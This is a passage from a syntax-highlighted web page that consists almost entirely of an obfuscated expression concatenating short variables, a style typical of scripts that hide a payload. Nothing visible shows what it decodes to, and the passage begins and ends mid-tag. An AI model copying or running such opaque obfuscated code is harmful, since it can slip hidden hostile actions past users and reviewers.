class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span 